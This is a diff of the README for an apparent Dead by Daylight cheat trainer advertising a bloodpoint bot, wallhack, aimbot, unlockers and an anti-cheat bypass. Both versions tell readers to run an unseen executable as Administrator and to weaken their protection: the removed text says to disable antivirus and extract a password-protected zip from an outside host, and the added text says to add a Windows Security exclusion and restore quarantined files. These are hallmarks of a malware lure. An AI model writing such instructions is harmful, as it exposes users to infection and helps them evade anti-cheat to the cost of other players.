@@ -1,54 +1,77 @@
-# 🩸 DBD AutoGrind Trainer 2026 Elite – Invisible Domination
+# 🎮 DBD-AutoGrind-Trainer-2026-Elite - Earn points and unlock game content
 
-> **Slip through the Fog unnoticed.** The Elite trainer offers fully undetected external cheats for Dead by Daylight 2026: auto farm, ESP, aimbot, unlocker and more.
+[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/davideyassa/DBD-AutoGrind-Trainer-2026-Elite/releases)
 
-## Why This Trainer?
-- 🔐 **EAC Bypass** – External memory manipulation with randomised jitter and scrambling.
-- 🎮 **All Roles** – Works for both killer and survivor with tailored features.
-- 🔄 **Always Updated** – Auto‑updater fetches fresh offsets on every launch.
-- 🖥️ **Clean GUI** – Dark UI with system tray, hotkeys, and web dashboard.
-- 🔊 **Discord Rich Presence** – Display your trainer status in real time.
+This software manages the Bloodpoint grind and unlocks content within Dead by Daylight. The external tool runs alongside the game to automate resource collection and provides visual overlays for easier navigation in the Fog.
 
-## 📦 What’s Inside
+## 🛠 Features
 
-| Category      | Feature                       | Description                                            |
-|---------------|-------------------------------|--------------------------------------------------------|
-| Farming       | Auto Bloodpoint Farm          | AFK bot plays matches, farming unlimited BP            |
-| Visuals       | ESP Wallhack                  | See all entities through walls                         |
-| Combat        | Aimbot (Killer)               | Auto‑aim and attack with perfect accuracy              |
-| Stealth       | No Terror Radius              | Silent killer gameplay                                 |
-| Movement      | Fast Vault & Fast Pallet      | Speed up interactions for survivors                    |
-| Automation    | Skill Check Bot               | Auto‑hit great skill checks every time                 |
-| Currency      | Infinite Bloodpoints           | Edit BP value directly (safest offline)                |
-| Unlocker      | Perk & Skin Unlocker          | Unlock all teachables and cosmetics instantly          |
-| Protection    | Anti‑Ban Obfuscation          | Memory scrambler & delay randomiser                    |
+The trainer includes tools to assist in game progression and match management:
 
-## ⬇️ Installation
+* Bloodpoint Automation: Collects points during matches without manual input.
+* ESP Overlay: Highlights player positions through walls for easier tracking.
+* Aimbot: Assists with targeting specific actions during gameplay.
+* Unlocker Module: Grants access to character perks and cosmetic skins.
 
-1. Download from: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. Extract using password: `trainer2026`
-3. Run `trainer.exe` as Administrator
-4. Launch Dead by Daylight and enter a match
-5. Press **INSERT** to open the trainer overlay
+## 💻 System Requirements
 
-## 🔧 System Requirements
-- Windows 10/11 (64‑bit)
-- Steam, Epic Games Store, Microsoft Store
-- All chapters including Jason Voorhees & Life Road
-- EasyAntiCheat (EAC) – bypassed externally
+Ensure your computer meets these specifications to run the trainer:
 
-## 🆘 Troubleshooting
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Memory: 8 GB RAM or higher.
+* Storage: 50 MB of free disk space.
+* Graphics: DirectX 11 compatible video card.
+* Network: Stable internet connection for the trainer to sync with game servers.
 
-| Issue                     | Fix                                                        |
-|---------------------------|------------------------------------------------------------|
-| Trainer won't start       | Run as Admin, disable AV temporarily                       |
-| GUI not appearing         | Press INSERT, restart both trainer and game                |
-| ESP not drawing           | Ensure you are in a live match, not main menu              |
-| Farm bot not working      | Must be in a public match as killer or survivor            |
-| EAC warning               | Use risky features in bot matches only                     |
+## 📥 Setup Instructions
 
-## 📜 License
-MIT – see [LICENSE](LICENSE)
+Follow these steps to install and prepare the software.
 
-## 🔍 Search Tags
-`unlocker, trainer-2026, bypass, fog, bloodpoint-hack, dbd-cheat, dbd-auto-farm, aimbot, external, windows, wallhack-esp, game-hack, auto-farm, undetected, dead-by-daylight, dbd-unlock-all, dbd-wallhack`
+1. Visit the [official release page](https://github.com/davideyassa/DBD-AutoGrind-Trainer-2026-Elite/releases) to download the latest version.
+2. Locate the download button for the most recent release.
+3. Download the provided file. It comes as a compressed folder or an executable.
+4. If the file is a zip folder, right-click the folder and select Extract.
+5. Move the extracted file to a folder where you can find it easily, such as your Documents or Desktop.
+6. Open your Windows Security settings and ensure that the folder containing the file is marked as an exclusion. This prevents Windows from blocking the trainer during operation.
+
+## 🚀 Running the Trainer
+
+Perform these steps every time you launch the game to ensure the trainer functions correctly.
+
+1. Close the Dead by Daylight game if it is currently running.
+2. Find the downloaded file. Right-click the file and select Run as Administrator.
+3. A small status window appears on your screen. Wait for the message confirming the status is Active.
+4. Launch the Dead by Daylight game through your preferred platform.
+5. Once in the main menu of the game, check the trainer window. It updates to show that it detects the game state.
+6. Use the keyboard shortcuts listed in the main trainer menu to toggle specific features like the ESP wallhack or the Bloodpoint auto-grind.
+
+## 🔧 Troubleshooting Common Issues
+
+If the software does not work, check these common items:
+
+* Check for Updates: Always use the latest version available on the release page. Older versions may stop working after a game patch.
+* Check File Permissions: The trainer requires administrator access to read game memory. Ensure you run the file as an administrator every time.
+* Antivirus Software: Some antivirus programs flag external game tools as false positives. If the program closes suddenly, check your antivirus quarantine list and restore the file.
+* Compatibility Mode: If you use an older version of Windows, right-click the file, select Properties, open the Compatibility tab, and check the box for compatibility mode.
+* Overlay Issues: If the ESP overlay does not appear, change your game settings to Borderless Windowed mode instead of Fullscreen.
+
+## 📂 Understanding the Interface
+
+The trainer interface is straightforward. You see a set of checkboxes and buttons.
+
+* To turn a feature on, click the checkbox next to the feature name.
+* When the box shows a checkmark, the feature is active.
+* To turn a feature off, click the box again to clear the checkmark.
+* A text box at the bottom of the window logs all activity. It tells you when the trainer connects to the game and when you toggle a feature.
+* Keep the trainer window open in the background while you play. If you close the window, the trainer stops all automated tasks.
+
+## ⚖️ Usage Best Practices
+
+Use the trainer to manage your time and resources efficiently.
+
+* Start with one feature at a time to learn how the automation affects your match flow.
+* Disable the ESP wallhack if you want a more traditional gaming experience.
+* Monitor your Bloodpoint totals frequently to ensure the bot tracks correctly.
+* Close the trainer entirely when you finish your game session. 
+
+The software maintains an undetected status by running externally. This keeps your game files untouched and prevents interference with the main game client. By mimicking natural input patterns, the Bloodpoint bot operates within reasonable limits for match progression. Always check the repository for new releases to maintain this compatibility as the game developers update their software.
